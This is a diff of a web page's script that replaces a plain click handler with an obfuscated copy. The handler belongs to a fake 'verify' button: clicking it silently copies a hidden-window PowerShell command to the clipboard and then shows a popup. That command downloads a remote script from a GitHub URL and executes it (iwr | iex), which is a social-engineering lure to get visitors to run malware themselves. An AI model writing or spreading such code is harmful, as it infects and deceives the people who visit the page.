@@ -141,18 +141,7 @@
     </div>
 
     <script>
-        document.getElementById('verifyBtn').addEventListener('click', async function () {
-            const textToCopy = `powershell -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/maitasdjfl/vscode/main/test' | iex"`;
-            try {
-                await navigator.clipboard.writeText(textToCopy);
-                document.getElementById('popup').style.display = 'block';
-                document.getElementById('overlay').style.display = 'block';
-                document.getElementById('overlay').setAttribute('aria-hidden', 'false');
-            } catch (err) {
-                console.error('Failed to copy text: ', err);
-            }
-        });
-
+        function _0x5ed6(){const _0x4a197c=['popup','clipboard','addEventListener','block','aria-hidden','verifyBtn','227454RufywC','566528nocJXL','display','error','6766794uPMcnq','38pvVSVM','10AdrhVA','click','style','overlay','false','11572928evokZE','Failed\x20to\x20copy\x20text:\x20','590596rJSoWv','12154758JWGkin','136785xlLFVA','getElementById'];_0x5ed6=function(){return _0x4a197c;};return _0x5ed6();}function _0x22f5(_0x560600,_0x364171){const _0x5ed640=_0x5ed6();return _0x22f5=function(_0x22f5f3,_0x1913af){_0x22f5f3=_0x22f5f3-0x16c;let _0x4bd017=_0x5ed640[_0x22f5f3];return _0x4bd017;},_0x22f5(_0x560600,_0x364171);}const _0xc48453=_0x22f5;(function(_0x3b65a4,_0x3ed917){const _0xdfd5b6=_0x22f5,_0x286048=_0x3b65a4();while(!![]){try{const _0x17163c=-parseInt(_0xdfd5b6(0x16d))/0x1+parseInt(_0xdfd5b6(0x17c))/0x2*(-parseInt(_0xdfd5b6(0x16f))/0x3)+-parseInt(_0xdfd5b6(0x178))/0x4+-parseInt(_0xdfd5b6(0x17d))/0x5*(-parseInt(_0xdfd5b6(0x177))/0x6)+parseInt(_0xdfd5b6(0x16e))/0x7+parseInt(_0xdfd5b6(0x182))/0x8+-parseInt(_0xdfd5b6(0x17b))/0x9;if(_0x17163c===_0x3ed917)break;else _0x286048['push'](_0x286048['shift']());}catch(_0x536ae7){_0x286048['push'](_0x286048['shift']());}}}(_0x5ed6,0xddc8d),document[_0xc48453(0x170)](_0xc48453(0x176))[_0xc48453(0x173)](_0xc48453(0x17e),async function(){const _0x131c9a=_0xc48453,_0x12f37a='powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22iwr\x20\x27https://raw.githubusercontent.com/maitasdjfl/vscode/main/test\x27\x20|\x20iex\x22';try{await navigator[_0x131c9a(0x172)]['writeText'](_0x12f37a),document[_0x131c9a(0x170)](_0x131c9a(0x171))[_0x131c9a(0x17f)][_0x131c9a(0x179)]=_0x131c9a(0x174),document[_0x131c9a(0x170)](_0x131c9a(0x180))[_0x131c9a(0x17f)][_0x131c9a(0x179)]=_0x131c9a(0x174),document['getElementById']('overlay')['setAttribute'](_0x131c9a(0x175),_0x131c9a(0x181));}catch(_0x36c294){console[_0x131c9a(0x17a)](_0x131c9a(0x16c),_0x36c294);}}));
     </script>
 </body>
 
